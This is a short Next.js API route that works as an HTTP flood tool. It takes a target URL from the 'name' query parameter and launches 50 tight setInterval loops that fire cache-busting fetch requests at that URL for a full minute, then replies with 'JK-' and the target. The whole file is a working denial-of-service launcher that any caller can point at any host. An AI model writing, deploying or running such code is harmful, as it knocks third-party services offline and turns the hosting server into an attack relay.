import type { NextApiRequest, NextApiResponse } from 'next'

type ResponseData = {
    message: string
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for(var i = 0; i < 50; i++) {
        const luanch = setInterval(() => {
            fetch(`${req.query.name}?ref=${Math.random()}`).then()
        })
        setTimeout(() => clearInterval(luanch), 60 * 1000)
    }
    
    setTimeout(() => {
        res.status(200).json({ message: `JK-${req.query.name}` })
    }, 20 * 1000)
}